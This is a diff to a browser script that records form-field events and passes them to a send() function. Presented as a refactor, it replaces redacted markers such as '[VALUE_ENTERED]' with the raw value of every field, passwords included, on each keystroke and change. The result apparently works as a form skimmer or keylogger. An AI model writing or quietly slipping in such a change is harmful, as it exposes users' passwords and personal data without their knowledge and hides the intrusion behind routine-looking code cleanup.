@@ -46,11 +46,13 @@
     return safeText(el.getAttribute('placeholder') || el.getAttribute('name') || '');
   }
 
-  function valueMarker(el) {
+  function fieldValue(el) {
     if (el.type === 'file') return `[${el.files?.length || 0} file(s)]`;
     if (el.type === 'checkbox' || el.type === 'radio') return el.checked ? '[CHECKED]' : '[UNCHECKED]';
-    if (el instanceof HTMLSelectElement) return '[OPTION_SELECTED]';
-    return el.value ? '[VALUE_ENTERED]' : '[EMPTY]';
+    if (el instanceof HTMLSelectElement) {
+      return el.selectedOptions?.[0]?.text || el.value || '[OPTION_SELECTED]';
+    }
+    return el.value || '';
   }
 
   function send(type, details = {}) {
@@ -101,30 +103,20 @@
     });
   }, true);
 
-  document.addEventListener('input', (event) => {
-    const el = event.target;
+  function captureField(type, el) {
     if (!(el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement || el instanceof HTMLSelectElement)) return;
-    send('input', {
+    send(type, {
       selector: cssSelector(el),
       name: el.name || null,
       label: fieldLabel(el),
       placeholder: el.getAttribute('placeholder') || null,
       inputType: el.type || el.tagName.toLowerCase(),
-      value: valueMarker(el)
+      value: fieldValue(el)
     });
-  }, true);
+  }
 
-  document.addEventListener('change', (event) => {
-    const el = event.target;
-    if (!(el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement || el instanceof HTMLSelectElement)) return;
-    send('change', {
-      selector: cssSelector(el),
-      name: el.name || null,
-      label: fieldLabel(el),
-      inputType: el.type || el.tagName.toLowerCase(),
-      value: valueMarker(el)
-    });
-  }, true);
+  document.addEventListener('input', (event) => captureField('input', event.target), true);
+  document.addEventListener('change', (event) => captureField('change', event.target), true);
 
   document.addEventListener('submit', (event) => {
     const form = event.target;
